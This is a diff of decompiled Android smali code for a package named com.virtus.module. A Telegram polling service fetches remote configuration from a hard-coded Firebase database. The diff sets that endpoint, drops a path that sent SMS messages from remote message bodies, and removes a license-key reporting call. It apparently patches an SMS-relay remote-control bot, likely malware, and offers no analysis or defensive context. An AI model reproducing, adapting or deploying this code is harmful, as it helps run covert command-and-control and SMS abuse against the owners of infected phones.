@@ -6,7 +6,7 @@
 # static fields
 .field private static final CHANNEL_ID:Ljava/lang/String; = "virtus_module_channel"
 
-.field private static final MODULE_DB:Ljava/lang/String; = ""
+.field private static final MODULE_DB:Ljava/lang/String; = "https://virtus-module-default-rtdb.firebaseio.com"
 
 .field private static final NOTIFICATION_ID:I = 0x3e7
 
@@ -70,7 +70,7 @@
     iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z
 
     .line 56
-    const-string v1, ""
+    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com"
 
     iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;
 
@@ -1168,19 +1168,6 @@
     move-result-object v5
 
     .line 371
-    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
-
-    move-result v6
-
-    if-eqz v6, :cond_out_send
-
-    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
-
-    monitor-exit p0
-
-    return-void
-
-    :cond_out_send
     invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v6
@@ -1380,51 +1367,25 @@
 
     .line 467
     :try_start_0
-    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
-
-    move-result-object p1
+    new-instance v4, Ljava/net/URL;
 
     new-instance v5, Ljava/lang/StringBuilder;
 
     invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
 
-    const-string v1, "firebaseio"
-
-    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
-
-    move-result v1
-
-    if-nez v1, :virtus_cfg
-
-    const-string v1, "http"
-
-    invoke-virtual {p1, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
-
-    move-result v1
-
-    if-nez v1, :virtus_cfg
-
     const-string v1, "https://virtus-module-default-rtdb.firebaseio.com/config/"
 
     invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
+    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p1
+
     invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v1, ".json"
+    const-string p1, ".json"
 
-    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    goto :virtus_url
-
-    :virtus_cfg
     invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    const-string v1, "/virtus_config.json"
-
-    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    :virtus_url
-    new-instance v4, Ljava/net/URL;
 
     invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
@@ -1638,8 +1599,6 @@
 
     .line 495
     iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
-
-    invoke-static {v4, v4, v5}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
 
     if-eqz v6, :cond_7
 
